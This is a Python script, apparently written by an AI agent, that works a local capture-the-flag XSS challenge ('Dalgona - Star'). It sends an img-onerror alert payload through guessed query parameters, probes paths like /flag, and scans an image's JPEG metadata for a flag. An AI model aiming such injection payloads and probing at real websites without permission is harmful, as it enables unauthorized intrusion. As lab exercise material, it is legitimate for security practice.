import requests
import urllib.parse
import re

base_url = "http://127.0.0.1:32955"
flag_pattern = re.compile(r'FLAG\{[^}]+\}', re.IGNORECASE)

# Let me look at the raw page response and see if there's any JavaScript that might give hints
print("[+] Getting raw page and analyzing JavaScript...")

resp = requests.get(f"{base_url}/page")
print(f"Response:\n{resp.text}")

# Check if there are any hidden scripts
scripts = re.findall(r'<script[^>]*>(.*?)</script>', resp.text, re.DOTALL | re.IGNORECASE)
print(f"\n[+] Found {len(scripts)} script blocks")
for s in scripts:
    print(f"Script: {s[:300] if s else 'empty'}")

# Check for any inline event handlers
inline = re.findall(r'on\w+="([^"]+)"', resp.text, re.IGNORECASE)
print(f"\n[+] Inline events: {inline}")

print("\n" + "=" * 60)
print("[+] Trying to find a submit endpoint...")

# The form has name="name" but no action or method - maybe it submits to itself via GET
# or perhaps there's a hidden submit handler

# Try common submit patterns
test_params = {
    'name': '<img src=x onerror=alert("XSS")>',
    'submit': '1',
    'search': '<img src=x onerror=alert("XSS")>',
    'payload': '<img src=x onerror=alert("XSS")>',
    'data': '<img src=x onerror=alert("XSS")>',
}

for param, value in test_params.items():
    url = f"{base_url}/page?{param}={urllib.parse.quote(value)}"
    resp = requests.get(url)
    flags = flag_pattern.findall(resp.text)
    if flags:
        print(f"[!] FLAG with param '{param}': {flags}")
    
    # Check for reflection
    if value in resp.text or urllib.parse.quote(value) in resp.text:
        print(f"[+] Param '{param}' reflects input")
        print(f"Response length: {len(resp.text)}")

print("\n" + "=" * 60)
print("[+] Looking at page title - 'Dalgona - Star' - maybe related to Cookie?")

# The title is "Dalgona - Star" and there's an image "new_star.png"
# Maybe we need to look at the cookies/new_star.png more carefully

# Check if there's a cookies directory or endpoint
cookie_paths = [
    "/cookies",
    "/cookie",
    "/star",
    "/new_star",
    "/flag",
    "/getflag",
    "/hint",
]

for path in cookie_paths:
    url = f"{base_url}{path}"
    try:
        resp = requests.get(url, timeout=5)
        print(f"[+] {path} - Status {resp.status_code} ({len(resp.text)} bytes)")
        flags = flag_pattern.findall(resp.text)
        if flags:
            print(f"    [!] FLAG: {flags}")
    except:
        pass

print("\n" + "=" * 60)
print("[+] Trying to analyze the background image...")

# Get the background image
resp_img = requests.get(f"{base_url}/static/img/dalgonabg.jpg")
print(f"Background image size: {len(resp_img.content)} bytes")

# Search for flag in JPEG
flags = flag_pattern.findall(resp_img.content.decode('latin-1', errors='ignore'))
if flags:
    print(f"[!] FLAG in background image: {flags}")

# Try to look for EXIF or other metadata
# JPEG starts with FF D8 and ends with FF D9
if resp_img.content[:2] == b'\xff\xd8':
    print("[+] Valid JPEG file")
    
    # Look for APP markers (FF E0 - FF EF)
    app_markers = []
    pos = 2
    while pos < len(resp_img.content) - 4:
        if resp_img.content[pos] == 0xFF:
            marker = resp_img.content[pos+1]
            if 0xE0 <= marker <= 0xEF:  # APP markers
                length = int.from_bytes(resp_img.content[pos+2:pos+4], 'big')
                app_data = resp_img.content[pos+4:pos+2+length]
                try:
                    text = app_data.decode('latin-1', errors='ignore')
                    flags = flag_pattern.findall(text)
                    if flags or 'flag' in text.lower():
                        print(f"[+] APP{marker-0xE0:X} marker: {text[:100]}")
                        if flags:
                            print(f"    [!] FLAG: {flags}")
                except:
                    pass
                pos += 2 + length
            elif marker == 0xD9:  # EOI
                break
            elif marker == 0xD8:  # SOI
                pos += 2
            else:
                length = int.from_bytes(resp_img.content[pos+2:pos+4], 'big')
                pos += 2 + length
        else:
            pos += 1

print("\n" + "=" * 60)
print("[+] Final check - maybe the flag is revealed when XSS is triggered via DOM...")

# Get the page and look at it more carefully
# Maybe the flag is stored in a hidden element that gets revealed via XSS

resp = requests.get(f"{base_url}/page")

# Look for hidden elements
hidden = re.findall(r'<[^>]+hidden[^>]*>', resp.text, re.IGNORECASE)
print(f"[+] Hidden elements: {hidden}")

# Look for style="display:none" or similar
hidden_style = re.findall(r'<[^>]+style="[^"]*display:\s*none[^"]*"[^>]*>', resp.text, re.IGNORECASE)
print(f"[+] Hidden by style: {hidden_style}")

# Look for input type="hidden"
hidden_inputs = re.findall(r'<input[^>]+type="hidden"[^>]*>', resp.text, re.IGNORECASE)
print(f"[+] Hidden inputs: {hidden_inputs}")

print("\n[+] Checking response without vs with payload (length comparison)...")
resp1 = requests.get(f"{base_url}/page")
resp2 = requests.get(f"{base_url}/page?input=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E")
print(f"Without payload: {len(resp1.text)} bytes")
print(f"With payload: {len(resp2.text)} bytes")

# If they're different, print both
diff = [i for i in range(min(len(resp1.text), len(resp2.text))) if resp1.text[i] != resp2.text[i]]
if diff:
    print(f"[+] Difference at positions: {diff[:20]}")
    for pos in diff[:5]:
        print(f"  Pos {pos}: '{resp1.text[max(0,pos-20):pos+20]}' vs '{resp2.text[max(0,pos-20):pos+20]}'")

print("\n[+] Analysis complete.")

